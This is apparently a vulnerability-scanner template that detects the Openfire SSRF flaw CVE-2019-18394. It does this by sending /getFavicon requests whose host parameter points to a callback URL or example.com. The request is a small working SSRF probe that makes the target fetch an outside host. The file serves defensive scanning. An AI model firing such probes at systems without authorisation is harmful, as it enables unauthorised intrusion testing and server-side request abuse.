name: yaml-poc-igniterealtime-openfire-logical-CVE-2019-18394
binding: 33cde258-1414-4e25-b99e-00a35b080708
manual: false
detail:
    author: jiapeng.han
    links:
        - https://github.com/igniterealtime/Openfire/pull/1497
        - https://nvd.nist.gov/vuln/detail/CVE-2019-18394
        - https://swarm.ptsecurity.com/openfire-admin-console/
        - https://vigilance.fr/vulnerability/Ignite-Openfire-privilege-escalation-via-FaviconServlet-java-GET-Requests-30719
    vulnerability:
        id: b8459216-8a21-45cb-ba1f-9bbb38fb5c28
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /getFavicon?host={{reverseURL}}
        expression: reverse.wait(5)
    r1:
        request:
            cache: true
            method: GET
            path: /getFavicon?host=www.example.com
        expression: response.status == 200 && response.content_type.contains("image/x-icon") && response.body.bcontains(bytes("<h1>Example Domain</h1>")) && response.body.bcontains(bytes("This domain is for use in illustrative examples in documents.")) && response.url.domain != "example.com"
expression: r0() || r1()
